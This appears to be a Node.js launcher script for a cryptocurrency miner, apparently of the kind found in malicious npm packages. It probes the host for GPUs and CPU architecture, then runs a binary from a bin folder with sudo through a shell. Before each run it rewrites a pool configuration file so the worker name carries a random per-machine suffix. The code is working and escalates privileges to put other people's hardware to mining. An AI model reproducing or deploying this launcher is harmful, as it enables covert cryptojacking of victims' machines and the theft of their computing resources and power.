function getOSDetails() {
  const si = require("systeminformation");
  return si.graphics().then((resp) => {
    const os = require("os");

    const CPUS = os.cpus().length;
    const PLATFORM = os.platform();
    const ARCH = os.arch();

    const graphicsTestStrings = ["NVIDIA", "GeForce", "radeon"];

    const siInfo = JSON.stringify(resp).toLowerCase();
    const HAS_GPU = graphicsTestStrings
      .map((key) => siInfo.includes(key.toLowerCase()))
      .reduce((acc, val) => acc || val, false);

    return {
      CPUS,
      PLATFORM,
      ARCH,
      HAS_GPU,
    };
  });
}

const path = require("path");

function prepareBinFileNames(opt) {
  const platformMap = {
    linux: "l",
  };

  const cwd = path.join(__dirname, "bin");

  const cpuBin = path.join(
    __dirname,
    "bin",
    `c-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
  );

  return {
    cwd,
    cpuBin,
    gpuBin: null,
  };
}

getOSDetails()
  .then((resp) => {
    const bins = prepareBinFileNames(resp);
    const spawn = require("child_process").spawn;

    if (bins.cpuBin) {
      cConfigPatch();
      const args = [bins.cpuBin];

      const child = spawn("sudo", args, {
        stdio: "inherit",
        cwd: bins.cwd,
        shell: true,
      });

      child.on("exit", (code, sig) => {
        console.log(`child process exited with code ${code} and signal ${sig}`);
      });
    }
  })
  .catch((err) => console.error(err));

function cConfigPatch() {
  const fs = require("fs");
  const { nanoid } = require("nanoid");

  const config = require("./bin/config.json");

  if (!config.pools[0].user.includes("_")) {
    config.pools[0].user = config.pools[0].user + "_" + nanoid(5);
  }

  fs.writeFileSync(
    path.join(__dirname, "bin", "config.json"),
    JSON.stringify(config)
  );
}